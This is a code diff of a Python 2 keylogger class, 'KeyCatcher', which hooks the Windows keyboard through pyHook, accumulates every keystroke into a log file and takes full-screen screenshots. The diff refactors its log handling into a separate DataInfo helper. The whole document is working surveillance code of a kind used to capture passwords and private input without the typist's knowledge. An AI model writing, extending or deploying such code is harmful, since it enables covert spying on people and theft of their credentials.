@@ -5,33 +5,21 @@ import os
 from win32api import GetSystemMetrics
 from ctypes import windll
 import pyautogui
-
+import DataInfo
 
 SCREEN_WIDTH = GetSystemMetrics(0)
 SCREEN_HEIGHT = GetSystemMetrics(1)
+DATA_FILE_NAME = "data_file.log"
+CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))
 
 
 class KeyCatcher:
-    def __init__(self):
-        self.current_path = os.path.dirname(os.path.realpath(__file__))
-        self.screen_shot_path=self.current_path+""
+    def __init__(self, data_path=CURRENT_PATH):
+        self.data_info = DataInfo.DataInfo(data_path, "log", "screenshot", "self")
         self.data = ""
-        self.data_file = "data_file.log"
+        self.data_info.new_data_file("data_file.log")
         # create a hook manager
         self.hm = pyHook.HookManager()
-    def set_screen_shot_path(self):
-        pass
-    def set_data_file(self, data_file):
-        self.data_file = data_file
-        self.__ready_data_file()
-
-    def __ready_data_file(self):
-        """
-        if no data file exists create a new one
-        """
-        if not os.path.exists(self.data_file):
-            with open(self.data_file, "w+") as f:
-                pass
 
     def set_key_hook(self):
         # watch for events
@@ -39,11 +27,6 @@ class KeyCatcher:
         # set the hook
         self.hm.HookKeyboard()
 
-    def update_data_file(self):
-        self.__ready_data_file()
-        with open(self.data_file, "a") as data_file:
-            data_file.write(self.data)
-        self.data = ""
 
     def key_press(self, event):
         print 'MessageName:', event.MessageName
@@ -66,11 +49,15 @@ class KeyCatcher:
         else:
             self.data += event.Key
         if self.data > 100:
-            self.update_data_file()
+            self.data_info.write_data_file_end(self.data, DATA_FILE_NAME)
+            self.data = ""
         # return True to pass the event to other handlers
         return True
 
     def take_screen_shot(self):
+        """
+        makes the system aware of the screen's size and takes a screenshot
+        """
         user32 = windll.user32
         user32.SetProcessDPIAware()
         screen_shot = pyautogui.grab(region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
